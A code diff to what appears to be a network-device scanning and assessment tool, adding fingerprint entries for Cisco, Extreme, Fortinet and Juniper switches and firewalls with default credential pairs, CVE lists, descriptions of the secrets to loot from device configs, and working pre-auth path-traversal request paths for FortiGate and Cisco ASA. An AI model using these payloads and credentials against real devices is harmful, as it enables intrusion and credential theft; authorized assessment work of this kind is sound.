@@ -31,6 +31,7 @@ class Product:
     id: str                       # short slug; sets host fact  is_<id>=true
     name: str                     # human name for findings
     ports: tuple                  # TCP ports the product listens on
+    kind: str = "mgmt"            # "mgmt" (Cluster A appliance) | "netdev" (switch/FW)
     patterns: tuple = ()          # regexes (case-insensitive) that CONFIRM it in
                                   #   a banner / HTTP title / Server header
     strong_ports: tuple = ()      # ports unique enough to identify on port alone
@@ -228,7 +229,111 @@ PRODUCTS: list[Product] = [
     ),
 ]
 
+# --------------------------------------------------------------------------- #
+# Cluster B — network devices & firewalls (SNMP + default creds + device CVEs)
+# --------------------------------------------------------------------------- #
+PRODUCTS += [
+    Product(
+        id="cisco_ios", name="Cisco IOS switch / router", kind="netdev",
+        ports=(22, 23, 80, 443, 4786, 161),
+        strong_ports=(4786,),   # Smart Install — Cisco-specific
+        # IOS-specific markers only (a bare "cisco" also matches ASA/FTD, which
+        # is a separate product) — plus the 4786 strong port catches switches.
+        patterns=(r"cisco ios", r"cisco internetwork", r"catalyst",
+                  r"C\d{4}", r"WS-C\d", r"IOS[- ]XE"),
+        web_port=443,
+        default_creds=(("cisco", "cisco"), ("admin", "admin"), ("admin", "cisco")),
+        cves=("CVE-2018-0171 — Smart Install (TCP 4786) unauthenticated config "
+              "exfil / RCE (SIET)",
+              "Type-7 / weak SNMP community disclosure in running-config",
+              "CVE-2017-3881 — IOS/IOS-XE Cluster Management Protocol RCE"),
+        loot="running-config holds enable secrets (type-5/7), SNMP communities, "
+             "VLAN + routing topology and line passwords — the keys to the "
+             "switching fabric. Grab it via Smart Install (4786) or an RW SNMP "
+             "community.",
+        severity="High", cvss="8.6",
+        attack=("T1190", "T1602.002", "T1602.001", "T1552.001"),
+    ),
+    Product(
+        id="extreme_exos", name="Extreme Networks EXOS switch", kind="netdev",
+        ports=(22, 23, 80, 443, 161),
+        patterns=(r"extremexos", r"extreme\s*networks", r"\bexos\b",
+                  r"\bsummit\b", r"\bBD\d"),
+        web_port=443,
+        default_creds=(("admin", ""), ("admin", "password")),
+        cves=("Default / blank 'admin' credentials common on EXOS",
+              "SNMP default community (public/private) exposes full config"),
+        loot="EXOS config holds SNMP communities, management credentials and the "
+             "switching topology; an RW community or the default admin owns the "
+             "switch.",
+        severity="High", cvss="7.5",
+        attack=("T1078", "T1602.001", "T1552.001"),
+    ),
+    Product(
+        id="fortigate", name="Fortinet FortiGate (FortiOS)", kind="netdev",
+        ports=(443, 10443, 8443, 22, 541),
+        strong_ports=(10443,),   # FortiGate SSL-VPN default port
+        patterns=(r"fortigate", r"fortios", r"fortinet"),
+        web_port=443,
+        default_creds=(("admin", ""),),
+        safe_poc={"path": "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
+                  "ok": r"(?i)var\s+fgt_lang|sslvpn_websession|\"user\"",
+                  "cve": "CVE-2018-13379",
+                  "desc": "FortiOS SSL-VPN pre-auth path traversal — session file "
+                          "readable (read-only confirmation; creds not extracted)."},
+        cves=("CVE-2022-40684 — authentication bypass on the admin interface "
+              "(add admin / change config)",
+              "CVE-2018-13379 — SSL-VPN pre-auth path traversal (plaintext creds leak)",
+              "CVE-2023-27997 — XORtigate SSL-VPN pre-auth heap overflow RCE"),
+        loot="FortiOS config holds admin password hashes, IPsec/SSL-VPN PSKs and "
+             "local user credentials; SSL-VPN session files leak plaintext VPN "
+             "credentials for lateral entry.",
+        severity="Critical", cvss="9.8",
+        attack=("T1190", "T1211", "T1552.001", "T1078"),
+    ),
+    Product(
+        id="juniper", name="Juniper (JunOS / J-Web)", kind="netdev",
+        ports=(443, 8443, 80, 22, 830),
+        patterns=(r"juniper", r"junos", r"j-web", r"jweb"),
+        web_port=443,
+        default_creds=(("root", ""), ("root", "juniper"), ("admin", "admin")),
+        safe_poc={"path": "/", "ok": r"(?i)juniper|junos|j-web",
+                  "cve": "", "desc": "Juniper J-Web management interface reachable."},
+        cves=("CVE-2023-36845 — J-Web PHP external-variable modification → "
+              "pre-auth RCE",
+              "CVE-2023-36844 — J-Web PHP variable injection",
+              "CVE-2020-1631 — J-Web path traversal arbitrary file read"),
+        loot="JunOS config holds root/user hashes ($1$/$6$), RADIUS/TACACS "
+             "secrets, IKE PSKs and SNMP communities.",
+        severity="Critical", cvss="9.8",
+        attack=("T1190", "T1552.001", "T1602.002"),
+    ),
+    Product(
+        id="cisco_asa", name="Cisco ASA / FTD firewall", kind="netdev",
+        ports=(443, 8443, 22),
+        patterns=(r"cisco\s*asa", r"adaptive\s*security", r"firepower",
+                  r"\bFTD\b", r"webvpn", r"\+CSCOE\+"),
+        web_port=443,
+        safe_poc={"path": "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../",
+                  "ok": r"(?i)portal_inc|function\s|status_string",
+                  "cve": "CVE-2020-3452",
+                  "desc": "ASA/FTD WebVPN pre-auth path traversal — arbitrary file "
+                          "read (read-only confirmation)."},
+        cves=("CVE-2020-3452 — ASA/FTD WebVPN pre-auth path traversal (file read)",
+              "CVE-2018-0296 — ASA path traversal (info disclosure / DoS)",
+              "CVE-2023-20269 — ASA/FTD VPN unauthorized access / brute-force"),
+        loot="ASA config holds VPN group passwords, local user hashes and tunnel "
+             "PSKs; the WebVPN file read discloses sessions and configuration.",
+        severity="High", cvss="8.6",
+        attack=("T1190", "T1552.001", "T1078"),
+    ),
+]
+
 _BY_ID = {p.id: p for p in PRODUCTS}
+
+
+def by_kind(kind: str) -> list:
+    return [p for p in PRODUCTS if p.kind == kind]
 
 
 def get(pid: str) -> Optional[Product]:
@@ -264,17 +369,20 @@ def _host_banner_text(entry: dict) -> str:
     return " ".join(bits)
 
 
-def identify(entry: dict, evidence: str = "") -> list[dict]:
+def identify(entry: dict, evidence: str = "", kind: str = "") -> list[dict]:
     """Products present on a host. Returns [{product, ports, reason}].
 
     A product matches when it shares an open port with the host AND either that
     port is *unique* to the product (strong_ports) or one of its banner/title
     patterns appears in the host's fingerprint text or the supplied `evidence`
-    (e.g. HTTP titles/headers captured by http_probe / whatweb / nuclei)."""
+    (e.g. HTTP titles/headers / SNMP sysDescr / SSH banners). Pass `kind` to
+    restrict to "mgmt" appliances or "netdev" network devices."""
     open_ports = _host_open_ports(entry)
     text = (_host_banner_text(entry) + " " + (evidence or "")).lower()
     out = []
     for prod in PRODUCTS:
+        if kind and prod.kind != kind:
+            continue
         hit_ports = sorted(open_ports & set(prod.ports))
         if not hit_ports:
             continue
